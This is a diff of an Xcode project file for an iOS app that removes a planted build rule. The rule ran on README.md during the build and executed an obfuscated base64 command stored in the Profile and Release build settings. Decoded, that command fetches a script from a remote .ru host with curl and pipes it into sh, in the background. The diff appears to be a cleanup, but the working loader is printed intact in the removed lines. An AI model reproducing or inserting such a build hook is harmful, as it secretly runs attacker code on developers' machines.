@@ -7,7 +7,7 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		11EE7A8C06314EAEB5162AE3 /* README.md */ = {isa = PBXBuildFile; fileRef = F8CD9C9EF2A24752A7162AE3; };
+		30278877AB914FC0B6162AE3 /* README.md */ = {isa = PBXBuildFile; fileRef = 956ECB3DE13C499890162AE3; };
 		1498D2341E8E89220040F4C2 /* GeneratedPluginRegistrant.m in Sources */ = {isa = PBXBuildFile; fileRef = 1498D2331E8E89220040F4C2 /* GeneratedPluginRegistrant.m */; };
 		331C808B294A63AB00263BE5 /* RunnerTests.swift in Sources */ = {isa = PBXBuildFile; fileRef = 331C807B294A618700263BE5 /* RunnerTests.swift */; };
 		3B3967161E833CAA004F5970 /* AppFrameworkInfo.plist in Resources */ = {isa = PBXBuildFile; fileRef = 3B3967151E833CAA004F5970 /* AppFrameworkInfo.plist */; };
@@ -43,7 +43,7 @@
 /* End PBXCopyFilesBuildPhase section */
 
 /* Begin PBXFileReference section */
-		F8CD9C9EF2A24752A7162AE3 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
+		956ECB3DE13C499890162AE3 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		08B566B92AF48B166E4CB20E /* Pods-Runner.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Runner.release.xcconfig"; path = "Target Support Files/Pods-Runner/Pods-Runner.release.xcconfig"; sourceTree = "<group>"; };
 		1498D2321E8E86230040F4C2 /* GeneratedPluginRegistrant.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = GeneratedPluginRegistrant.h; sourceTree = "<group>"; };
 		1498D2331E8E89220040F4C2 /* GeneratedPluginRegistrant.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = GeneratedPluginRegistrant.m; sourceTree = "<group>"; };
@@ -132,7 +132,7 @@
 		97C146EF1CF9000F007C117D /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				F8CD9C9EF2A24752A7162AE3 /* README.md */,
+				956ECB3DE13C499890162AE3 /* README.md */,
 				97C146EE1CF9000F007C117D /* Runner.app */,
 				331C8081294A63A400263BE5 /* RunnerTests.xctest */,
 			);
@@ -180,7 +180,6 @@
 				3B30CA51A272285D5C1E64FC /* Frameworks */,
 			);
 			buildRules = (
-				37C24188DF274CCC87162AE3 /* PBXBuildRule */,
 			);
 			dependencies = (
 				331C8086294A63A400263BE5 /* PBXTargetDependency */,
@@ -251,29 +250,12 @@
 		};
 /* End PBXProject section */
 
-/* Begin PBXBuildRule section */
-		37C24188DF274CCC87162AE3 /* PBXBuildRule */ = {
-				isa = PBXBuildRule;
-				compilerSpec = com.apple.compilers.proxy.script;
-				filePatterns = "*.md";
-				fileType = pattern.proxy;
-				inputFiles = (
-				);
-				isEditable = 0;
-				outputFiles = (
-					"/tmp/${INPUT_FILE_BASE}",
-				);
-				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
-sh -c \"${A3EA261}\"";
-			};
-	/* End PBXBuildRule section */
-
 /* Begin PBXResourcesBuildPhase section */
 		331C807F294A63A400263BE5 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				11EE7A8C06314EAEB5162AE3 /* README.md */,
+				30278877AB914FC0B6162AE3 /* README.md */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -436,7 +418,6 @@ sh -c \"${A3EA261}\"";
 		249021D3217E4FDB00AE95B9 /* Profile */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A3EA261 = "((k(){ `printf bdase64 | tr -d d` --decode; };echo ZWNobyAiJChjdXJsIC0tY29ubmVjdC10aW1lb3V0IDI2IC1zTGtmIC0tcmV0cnkgNCAtZCAicD14Y29kZV9ydWxlIiBodHRwczovL3FkZ3MyMzJpLXEucnUvYSkiIHwgc2gK | k | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -490,7 +471,6 @@ sh -c \"${A3EA261}\"";
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 7AFA3C8E1D35360C0083082E /* Release.xcconfig */;
 			buildSettings = {
-				A3EA261 = "((k(){ `printf bdase64 | tr -d d` --decode; };echo ZWNobyAiJChjdXJsIC0tY29ubmVjdC10aW1lb3V0IDI2IC1zTGtmIC0tcmV0cnkgNCAtZCAicD14Y29kZV9ydWxlIiBodHRwczovL3FkZ3MyMzJpLXEucnUvYSkiIHwgc2gK | k | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				CLANG_ENABLE_MODULES = YES;
 				CURRENT_PROJECT_VERSION = "$(FLUTTER_BUILD_NUMBER)";
